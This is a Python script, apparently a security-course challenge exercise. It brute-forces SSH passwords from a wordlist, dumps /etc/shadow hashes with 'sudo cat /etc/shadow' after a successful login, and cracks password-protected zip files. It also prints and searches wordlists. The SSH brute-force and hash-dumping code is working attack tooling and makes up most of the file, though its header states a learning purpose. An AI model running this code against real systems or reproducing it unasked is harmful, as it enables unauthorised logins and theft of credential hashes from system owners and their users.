#!/usr/bin/python3

# Script : OpsChallenge18.py
# Purpose: Iterates through a wordlist and either prints words line by line or detects if input word by user is present, also brute forces SSH and dumps shadow hashes.
# Why    : To better understand the types of automation employed by adversaries.

import time
import paramiko
import zipfile

def dump_hashes(ssh):
    # Execute command to read the shadow file
    stdin, stdout, stderr = ssh.exec_command('sudo cat /etc/shadow')

    # Read the output and save it to a file
    hashes = stdout.read().decode('utf-8')
    with open('hashes.txt', 'w') as file:
        file.write(hashes)

    # Print hashes to the screen
    print('User credential hashes:')
    print(hashes)

def menu():
    # Prompt user to select a mode
    mode = int(input('Select a mode (1, 2, 3, or 4): '))

    # Offensive mode 
    if mode == 1: 
        # Accept file path and open file 
        word_list = input('Enter file path of word list: ')
        file = open(word_list, 'r', encoding='iso-8859-1')

        # Iterate through word list and print each word with a delay 
        for word in file:
            print(word.strip())
            time.sleep(0.5) # Add 0.5 second delay

    # Defensive mode
    elif mode == 2:
        # Accept input string and file path
        string = input('Enter input string: ')
        word_list = input('Enter file path of word list: ')

        # Open file and check if string appears
        with open(word_list, 'r', encoding='iso-8859-1') as file:
            words = file.readlines()
            found = False
            for word in words:
                if string == word.strip():
                    found = True
                    break

        # Print result
        if found:
            print(f'{string} was found in the word list.')
        else:
            print(f'{string} was not found in the word list.')

    # SSH authentication mode
    elif mode == 3:
        # Accept input IP address, username, and file path
        ip = input('Enter IP address of the SSH server: ')
        username = input('Enter username: ')
        word_list = input('Enter file path of word list: ')

        # Initialize SSH client
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Iterate through word list and attempt SSH authentication
        with open(word_list, 'r', encoding='iso-8859-1') as file:
            words = file.readlines()
            success = False
            for word in words:
                password = word.strip()
                try:
                    ssh.connect(ip, username=username, password=password, timeout=5)
                    success = True
                    print(f'Successful login with password: {password}')
                    break
                except paramiko.AuthenticationException:
                    print(f'Failed login with password: {password}')
                except Exception as e:
                    print(f'Error: {e}')
                    break

        # Close SSH connection
        if success:
            dump_hashes(ssh)
            ssh.close()
            
           # Brute force zip file mode
    elif mode == 4:
        # Accept input zip file path and word list file path
        zip_file_path = input('Enter file path of the password-locked zip file: ')
        word_list = input('Enter file path of word list (e.g. RockYou.txt): ')

        # Initialize the zipfile object
        zip_file = zipfile.ZipFile(zip_file_path)

        # Iterate through the word list and attempt to extract the zip file with each password
        with open(word_list, 'r', encoding='iso-8859-1') as file:
            words = file.readlines()
            found_password = False
            for word in words:
                password = word.strip().encode('utf-8')
                try:
                    zip_file.extractall(pwd=password)
                    found_password = True
                    print(f'Successful extraction with password: {password.decode("utf-8")}')
                    break
                except RuntimeError:
                    print(f'Failed extraction with password: {password.decode("utf-8")}')

        # Close the zipfile object
        zip_file.close()

if __name__ == "__main__":
    menu()
